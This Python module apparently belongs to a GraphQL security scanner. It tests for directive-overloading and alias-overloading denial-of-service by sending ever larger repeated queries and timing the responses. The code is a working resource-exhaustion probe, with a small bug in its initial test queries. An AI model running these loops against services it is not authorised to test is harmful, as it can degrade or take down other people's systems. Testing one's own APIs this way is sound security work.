#!/usr/bin/env python

import time

from lib.utils.http import request
from lib.core.init import logger


def directive_overloading(url:str, headers:str=None, max_overloads:str=1) -> list:
    """
    Returns performance data which contains two lists: [response_time_milliseconds, overload_count]
    """
    logger.info("Testing Directive Overloading")
    
    
    #test it allows directives
    query = "query directive_test {{__typename @include(if:true)}}"
    results = request(
        url=url,
        method='POST',
        json_data={"query": query},
        headers=headers,
        timeout=10
    )
    results.raise_for_status()

    performance_data = [[], []] # [response_time_seconds, overload_count]
    overload_count = 1
    while True: #loop until we hit a stopping condition
        overload_count = overload_count * 2
        query = f"query directive_overload {{__typename {'@include(if:true) ' * overload_count}}}"
        results = request(
            url=url,
            method='POST',
            json_data={"query": query},
            headers=headers,
            timeout=120
        )
        response_time_ms = results.elapsed.total_seconds() * 1000

        #if not 'data' in results['json']:
        #    print("No data field in response, something went wrong")
        #    print(results['content'])
        #    return
        #check if we got a non-200 status code
        if results.status_code != 200:
            logger.error(f"Non-200 status code received, stopping test. \n Status Code: {results.status_code} - Response Time (ms): {response_time_ms}\n Content: {results.text}")
            return
        
        performance_data[1].append(overload_count)
        performance_data[0].append(response_time_ms)
        

        logger.info(f"Overload Count: {overload_count} - Response Time (ms): {response_time_ms}")

        if response_time_ms > 60000: #if the response time is over 60 seconds stop the test
            logger.info("Response time exceeded 60 seconds, stopping test")
            break
        if overload_count >= max_overloads:
            logger.info(f"Reached maximum overload count of {max_overloads}, stopping test")
            break
        
        # TODO: add a way to check if the response time is constnantly increasing
        # need to make sure that the repsonse times are tied to the overload count
        # - if the overload count is increasing but the response time is not the application is not vulnerable
        #    - could be using timouts to kill processing of the query
        #    - could have a limit to directives
        #    - could be filtering directives with a WAF
        #x += 1
        time.sleep(1) #be nice to the server
    return performance_data



def alias_overloading(url:str, headers:str=None, max_overloads:str=1) -> list:
    """
    Returns performance data which contains two lists: [response_time_milliseconds, overload_count]
    """
    logger.info("Testing Alias Overloading")
    
    #test it allows aliases
    query = "query alias_test {{alias: __typename}}"
    results = request(
        url=url,
        method='POST',
        json_data={"query": query},
        headers=headers,
        timeout=10
    )
    print(results.text)
    results.raise_for_status()

    performance_data = [[], []] # [response_time_seconds, overload_count]
    overload_count = 1
    while True: #loop until we hit a stopping condition
        overload_count = overload_count * 2
        aliases = f" alias{overload_count}: __typename" * overload_count
        query = f"query alias_overload {{__typename {aliases}}}"
        results = request(
            url=url,
            method='POST',
            json_data={"query": query},
            headers=headers,
            timeout=120
        )
        response_time_ms = results.elapsed.total_seconds() * 1000

        #if not 'data' in results['json']:
        #    print("No data field in response, something went wrong")
        #    print(results['content'])
        #    return
        #check if we got a non-200 status code
        if results.status_code != 200:
            logger.error(f"Non-200 status code received, stopping test. \n Status Code: {results.status_code} - Response Time (ms): {response_time_ms}\n Content: {results.text}")
            return
        
        performance_data[1].append(overload_count)
        performance_data[0].append(response_time_ms)
        

        logger.info(f"Overload Count: {overload_count} - Response Time (ms): {response_time_ms}")

        if response_time_ms > 60000: #if the response time is over 60 seconds stop the test
            logger.info("Response time exceeded 60 seconds, stopping test")
            break
        if overload_count >= max_overloads:
            logger.info(f"Reached maximum overload count of {max_overloads}, stopping test")
            break
        
        # TODO: add a way to check if the response time is constnantly increasing
        # need to make sure that the repsonse times are tied to the overload count
        # - if the overload count is increasing but the response time is not the application is not vulnerable
        #    - could be using timouts to kill processing of the query
        #    - could have a limit to directives
        #    - could be filtering directives with a WAF
        #x += 1
        time.sleep(1) #be nice to the server
    return performance_data